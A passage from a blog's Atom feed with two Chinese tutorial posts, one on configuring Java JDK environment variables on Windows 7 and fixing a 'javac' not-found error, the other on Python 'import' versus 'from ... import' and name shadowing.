    
    <content type="html"><![CDATA[<p> Windows7安装JDK的环境变量设置 Windows7 X64安装“jdk-6u26-windows-x64.exe”后，按照网上的环境变量设置方法设置了环境变量，但是死活都提示“javac不是内部命令或外部命令，也不是可运行的程序或批处理文件”。 </p><a id="more"></a><hr><ul><li>第一步：安装jdk-6u26-windows-x64.exe，路径为默认路径，一直下一步直到完成安装。</li></ul><hr><ul><li>第二步：设置环境变量：</li></ul><ol><li>进入环境变量设置的方法，这里只针对Windows7，其它的请童鞋们上网查找：     “计算机”右键“属性”——“高级系统设置”——“高级”——“环境变量”打开环境变量设置窗口。</li><li>在下面的“系统环境变量”设置窗口中，点击“新建”，建立JAVA_HOME变量：<br>变量名：JAVA_HOME<br>变量值：C:\Program Files\Java\jdk1.6.0_26</li></ol><ol><li>在下面的“系统环境变量”设置窗口中，点击“新建”，建立CLASSPATH变量：<br>变量名：CLASSPATH<br>变量值：C:\Program Files\Java\jdk1.6.0_26\lib\dt.jar;C:\Program Files\Java\jdk1.6.0_26\lib\tools.jar; （注意分号）</li></ol><ol><li>在下面的“系统环境变量”设置窗口中，双击“PATH”变量，在变量值后添加：    ;C:\Program Files\Java\jdk1.6.0_26\bin; (注意分号)<br>第三步：在“运行”中输入cmd，回车后，打开命令窗口，输入javac，如果出现下图：那就说明安装配置都正确了。<img src="https://i.imgur.com/zjpvXuu.png" alt=""><br>如果出现下图：<img src="https://i.imgur.com/pBZxVad.png" alt=""><br>那很不幸，童鞋们还得继续努力，请接着往下看：<br> 安装jdk，设置好环境变量后，在cmd中输入javac命令无法使用，提示“javac不是内部命令或外部命令，也不是可运行的程序或批处理文件”  但是输入 java -version能正常显示jdk版本号，说明java命令可用。我输入Java -home后，发现指向的路径完全不对，环境变量设置没起作用，不知是何原因。</li></ol><hr><p>解决方案：<br>运行——&gt;cmd<br>在控制台中运行以下命令设置java环境变量即可解决：<br>set java_home=C:\Program Files\Java\jdk1.6.0_26<br>set classpath=%JAVA_HOME%\lib\tools.jar;%JAVA_HOME%\lib\dt.jar;<br>set path=%JAVA_HOME%\bin; </p><hr><p>注：输入不区分大小写，另外附上几个Java命令<br>java -help  可以查看命令<br>java -home  查看JDK安装路径<br>java -version  查看JDK版本</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; Windows7安装JDK的环境变量设置 Windows7 X64安装“jdk-6u26-windows-x64.exe”后，按照网上的环境变量设置方法设置了环境变量，但是死活都提示“javac不是内部命令或外部命令，也不是可运行的程序或批处理文件”。 &lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python头文件</title>
    <link href="http://yoursite.com/2019/05/23/python%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    <id>http://yoursite.com/2019/05/23/python头文件/</id>
    <published>2019-05-23T06:14:22.930Z</published>
    <updated>2019-05-23T09:04:44.010Z</updated>
    
    <content type="html"><![CDATA[<p> <strong>python中的头文件</strong></p><ul><li>from math import sqrt</li></ul><p>是把sqrt作为本文件的方法导入进来了，使用的时候只需要直接调用sqrt。</p><a id="more"></a><hr><ul><li>import math</li></ul><p>如果import是import math，那么调用的时候要采用<strong>math.</strong>sqrt的方式。<br>那么如果在自己的文件里定义了相同名字的函数怎么办呢？</p><pre><code>from math import sqrtdef sqrt(n):   return n print sqrt(13689) </code></pre><p>运行py文件输出13689，所以自己定义了函数会自动屏蔽掉。<br>所以大量引用import math.<em>是个比较好的办法，from math import </em>就容易出错了，当然用到很少的函数且次数较多时上面这种办法会比较合适。<br>另外python不支持像java那样import math.sqrt</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; &lt;strong&gt;python中的头文件&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;from math import sqrt&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;是把sqrt作为本文件的方法导入进来了，使用的时候只需要直接调用sqrt。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
